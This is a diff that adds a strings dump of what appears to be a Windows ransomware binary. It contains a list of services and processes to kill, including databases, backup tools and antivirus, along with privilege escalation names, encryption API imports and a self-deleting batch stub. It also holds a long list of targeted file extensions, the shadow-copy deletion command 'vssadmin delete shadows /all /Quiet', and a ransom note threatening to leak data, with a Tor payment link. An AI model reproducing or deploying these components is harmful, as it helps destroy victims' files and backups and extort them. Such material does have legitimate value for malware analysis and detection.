@@ -1,0 +1,522 @@
+!This program cannot be run in DOS mode.
+.rdata
+@.data
+.pdata
+@.reloc
+SUVWATAUAVAWH
+8A_A^A]A\_^][
+UVWATAUAVAWH
+pA_A^A]A\_^]
+f99t"L
+f;L$ u
+@fB;LD t
+UWATAVAWH
+vtH9wPtnL9w@thfD9w8taD
+A_A^A\_]
+` AUAVAWH
+@A_A^A]
+9F,tCH
+WATAUAVAWH
+ A_A^A]A\_
+SeTakeOwnershipPrivilege
+SeRestorePrivilege
+SeDebugPrivilege
+agntsvc
+bengine
+benetns
+beremote
+beserver
+dbeng50
+dbsnmp
+dfssvc
+EduLink2SIMS
+encsvc
+fdhost
+firefox
+infopath
+isqlplussvc
+msaccess
+mydesktopservice
+mydesktopqos
+ocautoupds
+onenote
+oracle
+outlook
+OWSTIMER
+postgres
+powerpnt
+pvlsvr
+SAVAdminService
+SavService
+sqbcoreservice
+sophos
+swc_service
+synctime
+tbirdconfig
+thebat
+thunderbird
+VxLockdownServer
+winword
+wordpad
+wsstracing
+WSSADMIN
+xfssvccon
+[I] Check double run... 
+BLOCKED
+[I] FINISHED
+[W] SKIP FOLDER RP(%0.8X): %ws
+[W] SKIP FOLDER BL: %ws
+[W] SKIP FILE RP(%0.8X): %ws
+[E] ERROR: malloc(LOCK_CONTEXT)=%u
+[E] ERROR: CreateThread=%u
+[W] SKIP VOLUME: %ws - READ ONLY
+[I] SCAN VOLUME: %ws
+================================
+        Lock local drive        
+================================
+       Lock network drive       
+      Lock network shares       
+[W] NOT SUPPORTED
+%CLIENT_ID%
+0123456789abcdef
+[E] ERROR: RSA(MasterKey)=%u
+attrib -s -r -h %1
+del /F /Q %1
+if exist %1 goto l
+del %0 
+--------- FILES ---------
+Total:
+Locked:
+--------- ERROR ---------
+Rename:
+------- SIZE STATS -------
+Total locked:
+%.3f GB
+------- SPEED STATS ------
+Crypt Avg:
+%0.3f MB/s
+Crypt Max:
+%0.3f MB/s
+Files:
+%0.3f files/s
+%0.0f sec
+_vsnprintf
+_getch
+msvcrt.dll
+GetVolumeInformationW
+FindFirstFileW
+HeapFree
+FindNextFileW
+lstrlenW
+FindClose
+GetLastError
+lstrcatW
+HeapAlloc
+LocalFree
+GetProcessHeap
+lstrcpyW
+WriteFile
+CreateFileW
+CloseHandle
+GetCurrentProcess
+TerminateProcess
+OpenProcess
+HeapReAlloc
+GetCurrentProcessId
+WideCharToMultiByte
+SetErrorMode
+CreateMutexW
+GetWindowsDirectoryW
+GetFileSizeEx
+UnmapViewOfFile
+GetTickCount64
+SetFilePointerEx
+CreateFileMappingW
+MapViewOfFile
+CreateThread
+lstrcmpiW
+MoveFileW
+GetDriveTypeW
+GetCommandLineW
+GetModuleFileNameW
+ExitProcess
+lstrlenA
+GetComputerNameA
+GetTempPathW
+CreateProcessW
+GetTickCount
+GetConsoleScreenBufferInfo
+GetStdHandle
+WriteConsoleA
+SetConsoleCursorPosition
+AllocConsole
+GetSystemDirectoryW
+KERNEL32.dll
+StrStrIA
+StrCmpIW
+StrStrIW
+SHRegSetUSValueW
+SHLWAPI.dll
+ZwQuerySystemInformation
+ntdll.dll
+CharLowerW
+wsprintfW
+USER32.dll
+GetNamedSecurityInfoW
+SetNamedSecurityInfoW
+FreeSid
+AllocateAndInitializeSid
+SetEntriesInAclA
+OpenProcessToken
+LookupPrivilegeValueA
+AdjustTokenPrivileges
+CryptReleaseContext
+CryptImportKey
+CryptEncrypt
+CryptAcquireContextW
+CryptDestroyKey
+ADVAPI32.dll
+memset
+bcb4e8508db9401e69c93177dd1410c05
+<html>
+<head>
+<title>RECOVERY MANUAL</title>
+</head>
+<body>
+<h1>Your ClientId:</h1>
+      
+%CLIENT_ID%                                                     
+</pre>
+<b>/!\ YOUR COMPANY NETWORK HAS BEEN PENETRATED /!\<br>
+All your important files have been encrypted!</b><br>
+Your files are safe! Only modified. (RSA+AES)<br><br>
+ANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE<br>
+WILL PERMANENTLY CORRUPT IT.<br>
+DO NOT MODIFY ENCRYPTED FILES.<br>
+DO NOT RENAME ENCRYPTED FILES.<br><br>
+No software available on internet can help you. We are the only ones able to<br>
+solve your problem.<br><br>
+We gathered highly confidential/personal data. These data are currently stored on<br>
+a private server. This server will be immediately destroyed after your payment.<br>
+If you decide to not pay, we will release your data to public or re-seller.<br>
+So you can expect your data to be publicly available in the near future..<br><br>
+We only seek money and our goal is not to damage your reputation or prevent<br>
+your business from running.<br><br>
+You will can send us 2-3 non-important files and we will decrypt it for free<br>
+to prove we are able to give your files back.<br><br>
+        <hr/>
+<b>Contact us for price and get decryption software.</b><br><br>
+<a href="http://zsa3wxvbb7gv65wnl7lerslee3c7i27ndqghqm6jt2priva2qcdponad.onion/?cid=%CLIENT_ID%                                                     ">http://zsa3wxvbb7gv65wnl7lerslee3c7i27ndqghqm6jt2priva2qcdponad.onion/?cid=%CLIENT_ID%                                                     </a><br>
+* Note that this server is available via Tor browser only<br><br>
+Follow the instructions to open the link:<br>
+              1. Type the addres "https://www.torproject.org" in your Internet browser. It opens the Tor site.<br>
+              2. Press "Download Tor", then press "Download Tor Browser Bundle", install and run it.<br>
+              3. Now you have Tor browser. In the Tor Browser open "http://zsa3wxvbb7gv65wnl7lerslee3c7i27ndqghqm6jt2priva2qcdponad.onion/?cid=%CLIENT_ID%                                                     ". <br>
+              4. Start a chat and follow the further instructions. <br><br>
+<b>Make contact as soon as possible. Your private key (decryption key) <br>
+is only stored temporarily.<br><br>
+IF YOU DON'T CONTACT US WITHIN 72 HOURS, PRICE WILL BE HIGHER.</b><br>
+</body>
+</html>
+Microsoft Enhanced Cryptographic Provider v1.0
+%0.8X%0.8X%0.8X%0.8X
+System Volume Information
+$RECYCLE.BIN
+Windows
+$WINDOWS.~BT
+Windows.old
+Program Files
+Program Files (x86)
+NVIDIA
+SYSTEM.SAV
+PerfLog
+microsoft
+RecoveryManual.html
+/scan:
+/marker:
+/nodel
+explorer.exe RecoveryManual.html
+Software\Classes\.%0.8X\shell\Open\command
+.ReadManual.%0.8X
+\%0.8X.bat
+"%s" "%s"
+d3dbsp
+darkness
+database
+dayzprofile
+db-journal
+db_journal
+debian
+default
+description
+design
+desklink
+directory
+dmtemplate
+docenx
+dochtml
+docmhtml
+docset
+docstates
+documentrevisions-v100
+docxml
+dothtml
+dotmenx
+dotxenx
+dwlibrary
+dxstudio
+acrobatsecuritysettings
+acrodata
+acroplugin
+acrypt
+afdesign
+age3rec
+age3sav
+age3scn
+age3xrec
+age3xsav
+age3xscn
+age3yrec
+age3ysav
+age3yscn
+approj
+arch00
+atomsvc
+automaticdestinations-ms
+backup
+backupdb
+bamboopaper
+bbprojectd
+bibtex
+bitstak
+bizdocument
+blend2
+breaking_bad
+burntheme
+camproj
+catdrawing
+catfct
+catpart
+catproduct
+cccrrrppp
+cerber
+cerber2
+cerber3
+cgfiletypetest
+chmprj
+chpscrap
+civ4worldbuildersave
+civbeyondswordsave
+cl2arc
+cl2doc
+clarify
+comicdoc
+comiclife
+compositionmodel
+compositiontemplate
+config
+contact
+converterx
+coverton
+crashed
+creole
+crjoker
+crptrgr
+crypted
+cryptolocker
+cryptowall
+cryptra
+current
+czvxce
+emlxpart
+enciphered
+encrypt
+encrypted
+enfpack
+enigma
+erbsql
+exprwdhtml
+exprwdxml
+fadein
+fantom
+feed-ms
+feedsdb-ms
+ffdata
+fountain
+fpdoclib
+fphomeop
+fplinkbar
+freepp
+fwtemplate
+groups
+gsheet
+gslides
+helpindex
+herbst
+hmskin
+htpasswd
+ibooks
+icalevent
+icaltodo
+incpas
+inprogress
+installhelper
+internetconnect
+jrprint
+kernel_complete
+kernel_pid
+kernel_time
+key-tef
+keybtc@inbox_com
+keynote
+kimcilware
+kraken
+kratos
+laccdb
+lastlogin
+layout
+lechiffre
+legion
+litemod
+lngttarch2
+localstorage
+locked
+logonxp
+mapimail
+markdn
+mcgame
+mcmeta
+mdbackup
+mdbhtml
+mdccache
+mddata
+mecontact
+mellel
+metadata_never_index
+mgourmet
+mgourmet3
+mhtenx
+mhtmlenx
+mindnode
+mission
+mlsxml
+moneywell
+mrwref
+ms-tnef
+mydocs
+narrative
+navmap
+nfs11save
+nmbtemplate
+nokogiri
+nrmlib
+number
+numbers
+odccubefile
+odcodc
+officeui
+p5tkjw
+padcrypt
+pages-tef
+paymrss
+paymst
+paymts
+payrms
+pbx5script
+pbxscript
+pdf_profile
+pdf_tsid
+pdfenx
+pdfxml
+pixexp
+pkpass
+plus_muhd
+poar2w
+pothtml
+ppsenx
+ppthtml
+pptmhtml
+pro4dvd
+pro5dvd
+pro5plx
+proofingtool
+prproj
+psafe3
+pse8db
+pspimage
+pubhtml
+pubmhtml
+qlgenerator
+rdoc_options
+recources
+resbuild
+result
+rgss3a
+rwlibrary
+safetext
+sas7bdat
+sc2save
+scrivx
+scspack
+sddraft
+sdmdocument
+search-ms
+secure
+securecrypted
+server
+sldasm
+sldprt
+sqlite
+sqlite3
+sqlitedb
+sqllite
+struct
+surprise
+switch
+syncdb
+tabula-doc
+tabula-docstyle
+tax2009
+tax2013
+tax2014
+template
+texinfo
+textclipping
+textile
+tmlanguage
+torrent
+totalslayout
+trashinfo
+txtrpt
+unity3d
+urd-journal
+vbadoc
+vcproj
+vcxproj
+venusf
+voprefs
+vpp_pc
+vspolicy
+vthought
+wallet
+wallet001
+webdoc
+webpart
+windows10
+wordlist
+wotreplay
+xcodeproj
+xlshtml
+xlsx3gp
+xlthtml
+xmt_bin
+xweb3htm
+xweb3html
+xweb4stm
+xweb4xml
+ycbcra
+zcrypt
+zip73i87a
+ztmp$efs
+zyklon
+\vssadmin.exe delete shadows /all /Quiet
